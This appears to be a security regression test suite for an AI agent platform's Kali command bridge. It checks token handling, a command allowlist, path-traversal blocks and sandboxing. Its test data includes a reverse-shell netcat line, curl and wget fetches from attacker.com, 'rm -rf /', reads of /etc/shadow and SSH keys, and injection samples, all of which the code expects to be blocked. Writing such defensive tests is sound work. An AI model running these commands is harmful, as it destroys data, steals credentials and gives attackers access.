import assert from 'assert';
import fs from 'fs';
import path from 'path';
import { config } from '../server/config.ts';
import { kaliBridge, validateBridgeCommand } from '../server/kali/bridge.ts';
import { TOOL_REGISTRY } from '../server/tools/registry.ts';
import { permissionEngine } from '../server/permissions/engine.ts';
import { taskEngine } from '../server/tasks/engine.ts';
import { dbManager } from '../server/database.ts';

async function runSecurityTests() {
  console.log('====================================================');
  console.log('   EDITH AI OS - SECURITY REGRESSION TEST SUITE     ');
  console.log('====================================================\n');

  let passed = 0;
  let failed = 0;

  async function test(name: string, fn: () => Promise<void> | void) {
    try {
      await fn();
      console.log(` \x1b[32m[PASS]\x1b[0m ${name}`);
      passed++;
    } catch (err: unknown) {
      console.error(` \x1b[31m[FAIL]\x1b[0m ${name}`);
      console.error(`        Error: ${err instanceof Error ? err.message : String(err)}`);
      failed++;
    }
  }

  await dbManager.initialize();

  // 1. Loopback Binding by Default
  await test('1. Local service binds to loopback (127.0.0.1) by default', () => {
    assert.strictEqual(config.HOST, '127.0.0.1', 'Default HOST must be 127.0.0.1 loopback');
  });

  // 2. Cryptographic Bridge Token
  await test('2. Cryptographically strong bridge token generated and stored securely', () => {
    const token = kaliBridge.getBridgeToken();
    assert.ok(token && token.length >= 32, 'Bridge token must be at least 32 characters');
    const tokenFile = path.resolve(process.cwd(), '.bridge_token');
    assert.ok(fs.existsSync(tokenFile), '.bridge_token file must exist');
    const fileContent = fs.readFileSync(tokenFile, 'utf-8').trim();
    assert.strictEqual(fileContent, token, 'File content must match in-memory token');
  });

  // 3. Timing-Safe Token Authentication
  await test('3. Timing-safe token verification rejects invalid and unauthenticated requests', () => {
    const validToken = kaliBridge.getBridgeToken();
    assert.strictEqual(kaliBridge.verifyToken(validToken), true, 'Valid token must be accepted');
    assert.strictEqual(kaliBridge.verifyToken(`Bearer ${validToken}`), true, 'Bearer prefixed token must be accepted');
    assert.strictEqual(kaliBridge.verifyToken('wrong-token'), false, 'Invalid token must be rejected');
    assert.strictEqual(kaliBridge.verifyToken(''), false, 'Empty token must be rejected');
    assert.strictEqual(kaliBridge.verifyToken(null), false, 'Null token must be rejected');
    assert.strictEqual(kaliBridge.verifyToken(undefined), false, 'Undefined token must be rejected');
    assert.strictEqual(kaliBridge.verifyToken(validToken.slice(0, -1)), false, 'Truncated token must be rejected');
  });

  // 4. Validated Action Registry - Whitelisted Commands Allowed
  await test('4. Validated action registry permits allowlisted Kali security tools', () => {
    const validCommands = [
      'uname -a',
      'whoami',
      'hostname',
      'ip -brief addr',
      'ps aux',
      'df -h',
      'which nmap',
      'nmap -sT -p 80,443 127.0.0.1',
    ];

    for (const cmd of validCommands) {
      const res = validateBridgeCommand(cmd);
      assert.strictEqual(res.valid, true, `Command '${cmd}' should be valid, got: ${res.error}`);
      assert.ok(res.executable, 'Executable must be parsed');
    }
  });

  // 5. Validated Action Registry - Shell Metacharacters Blocked
  await test('5. Validated action registry blocks dangerous shell metacharacters', () => {
    const maliciousCommands = [
      'uname -a; rm -rf /',
      'whoami && cat /etc/shadow',
      'nmap 127.0.0.1 | bash',
      'whoami `id`',
      'whoami $(id)',
      'whoami > /tmp/out',
      'cat < /etc/shadow',
      'uname -a\nwhoami',
      'uname -a\rwhoami',
    ];

    for (const cmd of maliciousCommands) {
      const res = validateBridgeCommand(cmd);
      assert.strictEqual(res.valid, false, `Command '${cmd}' must be blocked`);
      assert.ok(res.error?.includes('prohibited shell operators'), `Expected operator rejection, got: ${res.error}`);
    }
  });

  // 6. Validated Action Registry - Non-whitelisted Executables Blocked
  await test('6. Validated action registry blocks non-allowlisted binaries', () => {
    const unapproved = [
      'bash -i',
      'sh -c whoami',
      'nc -e /bin/sh 127.0.0.1 4444',
      'python3 -c "import pty"',
      'curl http://attacker.com/payload',
      'wget http://attacker.com/rev.sh',
    ];

    for (const cmd of unapproved) {
      const res = validateBridgeCommand(cmd);
      assert.strictEqual(res.valid, false, `Command '${cmd}' must be blocked as unapproved binary`);
      assert.ok(res.error?.includes('not permitted by the Kali bridge action registry'));
    }
  });

  // 7. Sensitive System Path Access in Arguments Blocked
  await test('7. Access to sensitive system paths in arguments is blocked', () => {
    const sensitiveArgs = [
      'df /etc/shadow',
      'which /etc/sudoers',
      'which /root/.ssh/id_rsa',
      'df ../../../etc/shadow',
    ];

    for (const cmd of sensitiveArgs) {
      const res = validateBridgeCommand(cmd);
      assert.strictEqual(res.valid, false, `Argument in '${cmd}' must be blocked`);
    }
  });

  // 8. Path Traversal Protection in open_folder
  await test('8. Path traversal outside approved directories in open_folder is strictly blocked', async () => {
    const openFolderTool = TOOL_REGISTRY['open_folder'];
    assert.ok(openFolderTool, 'open_folder must exist in registry');

    // Forbidden paths
    await assert.rejects(async () => {
      await openFolderTool.execute({ folder_path: '/etc' });
    }, /Access to folder .* is restricted/);

    await assert.rejects(async () => {
      await openFolderTool.execute({ folder_path: '/root' });
    }, /Access to folder .* is restricted/);

    await assert.rejects(async () => {
      await openFolderTool.execute({ folder_path: '/proc' });
    }, /Access to folder .* is restricted/);

    // Allowed workspace path
    const allowed = await openFolderTool.execute({ folder_path: 'workspace' });
    assert.ok(allowed.opened, 'Workspace folder must be allowed');
  });

  // 9. run_code_simulation Confirmation Requirement & Sandboxing
  await test('9. run_code_simulation requires user confirmation and prevents auto-execution', async () => {
    const codeTool = TOOL_REGISTRY['run_code_simulation'];
    assert.strictEqual(codeTool.risk, 'REQUIRES_CONFIRMATION', 'run_code_simulation must require confirmation');

    // Passing through permission engine without bypassConfirmation must return REQUIRES_CONFIRMATION
    const evaluation = await permissionEngine.evaluateAndExecute(codeTool, {
      language: 'javascript',
      code: 'Math.max(1, 2)',
    });
    assert.strictEqual(evaluation.status, 'REQUIRES_CONFIRMATION', 'Must halt and create confirmation dialog');
    assert.ok(evaluation.pendingAction, 'Pending action must be generated');
  });

  // 10. JavaScript VM Sandboxing prevents process/require escape
  await test('10. JavaScript execution in run_code_simulation cannot access Node process or require', async () => {
    const codeTool = TOOL_REGISTRY['run_code_simulation'];
    const result = (await codeTool.execute({
      language: 'javascript',
      code: 'typeof process !== "undefined" ? process.pid : "NO_PROCESS"',
    })) as Record<string, unknown>;

    assert.strictEqual(result.execution_status, 'SUCCESS');
    assert.strictEqual(result.returned_value, 'NO_PROCESS', 'process object must not leak into sandboxed runtime');
  });

  // 11. Truthful Execution in Task Engine
  await test('11. Task engine security audit and code analysis perform truthful execution', async () => {
    // 1. Security Audit Task
    const auditTask = await taskEngine.spawnSecurityAuditTask('127.0.0.1');
    assert.ok(auditTask.id, 'Task must be spawned');
    assert.strictEqual(auditTask.category, 'SYSTEM');

    // Wait 1.5s for real socket probes to run
    await new Promise((r) => setTimeout(r, 1500));
    const updatedAudit = taskEngine.getTask(auditTask.id);
    assert.ok(updatedAudit, 'Task must exist in engine');
    assert.ok(updatedAudit.logs.length > 1, 'Task must record execution logs');

    // 2. Code Analysis Task with OWASP detection
    const vulnCode = 'const q = "SELECT * FROM users WHERE id = " + req.query.id; eval(userPayload);';
    const codeTask = await taskEngine.spawnCodeAnalysisTask(vulnCode);
    await new Promise((r) => setTimeout(r, 1500));
    const updatedCode = taskEngine.getTask(codeTask.id);
    assert.ok(updatedCode, 'Code task must exist');
    assert.ok(updatedCode.logs.some((l) => l.includes('findings') || l.includes('OWASP')), 'Code task must run real static analysis');
  });

  // 12. Output Truncation Limits
  await test('12. Output limits are enforced on Kali command results', () => {
    const testJob = kaliBridge.queueCommand('uname -a');
    const hugeOutput = 'A'.repeat(100000); // 100KB output
    const ok = kaliBridge.submitResult(testJob.id, hugeOutput, 0);
    assert.strictEqual(ok, true);

    const savedJob = kaliBridge.getJob(testJob.id);
    assert.ok(savedJob, 'Job must be retrieved');
    assert.ok(savedJob.output.length <= 66000, 'Output must be truncated to around 64KB');
    assert.ok(savedJob.output.includes('[... truncated by EDITH 64KB output limit]'));
  });

  console.log('====================================================');
  console.log(` RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log('====================================================');

  if (failed > 0) {
    process.exit(1);
  }
}

runSecurityTests().catch((err) => {
  console.error('Test runner fatal error:', err);
  process.exit(1);
});
